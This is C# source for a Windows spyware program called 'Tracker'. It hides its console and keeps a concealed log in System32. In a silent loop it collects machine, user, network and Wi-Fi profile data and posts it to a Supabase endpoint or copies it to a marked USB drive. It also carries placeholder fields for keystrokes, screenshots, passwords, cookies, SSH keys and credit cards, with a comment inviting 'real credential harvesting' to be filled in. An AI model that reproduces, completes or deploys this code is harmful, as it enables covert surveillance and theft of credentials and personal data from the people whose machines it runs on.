using System;
using System.IO;
using System.Threading;
using System.Net.Http;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Diagnostics;

namespace Tracker {
    class Program {
        // ============================================================
        // STEALTH: HIDE CONSOLE WINDOW
        // ============================================================
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // ============================================================
        // SUPABASE CONFIG – REPLACE WITH YOUR OWN CREDENTIALS
        // ============================================================
        static string SUPABASE_URL = "https://your-project.supabase.co";
        static string SUPABASE_KEY = "your-anon-key";
        static string TRACKER_ID = "TRK_" + Guid.NewGuid().ToString().Substring(0, 8).ToUpper();

        static string logFile = @"C:\Windows\System32\.tracker_log"; // Hidden

        static void Main() {
            // Hide console
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            // Main loop
            while (true) {
                try {
                    string data = CollectAllData();

                    if (HasInternet()) {
                        SendToSupabase(data);
                        File.WriteAllText(logFile, "");
                    } else {
                        File.AppendAllText(logFile, data + "\n");
                    }

                    // USB exfiltration (Node C detection)
                    if (IsNodeCPresent()) {
                        SendViaUSB(data);
                    }

                    Thread.Sleep(60000);
                } catch { /* silent fail */ }
            }
        }

        // ============================================================
        // COLLECT ALL DATA
        // ============================================================
        static string CollectAllData() {
            return JsonConvert.SerializeObject(new {
                tracker_id = TRACKER_ID,
                device_name = Environment.MachineName,
                os = Environment.OSVersion.ToString(),
                username = Environment.UserName,
                ssid = GetWifiSSID(),
                rssi = GetWifiRSSI(),
                public_ip = GetPublicIP(),
                latitude = "0.0",
                longitude = "0.0",
                altitude = "0.0",
                magnitude = GetWifiRSSI(),
                keystrokes = "(demo)",
                screenshot = "(demo)",
                saved_passwords = GetSavedPasswords(),
                wifi_passwords = GetWiFiPasswords(),
                browser_cookies = "(demo)",
                ssh_keys = "(demo)",
                browser_history = "(demo)",
                clipboard_data = "(demo)",
                emails = "(demo)",
                credit_cards = "(demo)"
            });
        }

        // --- STUB FUNCTIONS (replace with real credential harvesting) ---
        static string GetSavedPasswords() { return "{\"gmail.com\":\"demo_pass\"}"; }
        static string GetWiFiPasswords() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show profiles";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return result;
            } catch { return "ERROR"; }
        }

        static bool HasInternet() {
            try {
                using (var client = new HttpClient()) {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var response = client.GetAsync("https://supabase.co").Result;
                    return response.IsSuccessStatusCode;
                }
            } catch { return false; }
        }

        static async void SendToSupabase(string data) {
            using (HttpClient client = new HttpClient()) {
                client.DefaultRequestHeaders.Add("apikey", SUPABASE_KEY);
                client.DefaultRequestHeaders.Add("Authorization", "Bearer " + SUPABASE_KEY);
                var content = new StringContent(data, System.Text.Encoding.UTF8, "application/json");
                await client.PostAsync(SUPABASE_URL + "/rest/v1/tracker_data", content);
            }
        }

        static bool IsNodeCPresent() {
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    if (File.Exists(drive.Name + "nodec.txt")) return true;
                }
            }
            return false;
        }

        static void SendViaUSB(string data) {
            foreach (var drive in DriveInfo.GetDrives()) {
                if (drive.DriveType == DriveType.Removable && drive.IsReady) {
                    File.WriteAllText(drive.Name + "tracker_data.json", data);
                }
            }
        }

        static string GetWifiSSID() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show interfaces";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var match = System.Text.RegularExpressions.Regex.Match(result, @"SSID\s*:\s*(.+)");
                return match.Success ? match.Groups[1].Value.Trim() : "Unknown";
            } catch { return "Unknown"; }
        }

        static int GetWifiRSSI() {
            try {
                Process p = new Process();
                p.StartInfo.FileName = "netsh";
                p.StartInfo.Arguments = "wlan show interfaces";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var match = System.Text.RegularExpressions.Regex.Match(result, @"Signal\s*:\s*(\d+)%");
                if (match.Success) {
                    int rssi = int.Parse(match.Groups[1].Value);
                    return (rssi / 2) - 100;
                }
                return 0;
            } catch { return 0; }
        }

        static string GetPublicIP() {
            try {
                using (var client = new HttpClient()) {
                    return client.GetStringAsync("https://api.ipify.org?format=json").Result;
                }
            } catch { return "Unknown"; }
        }
    }
}
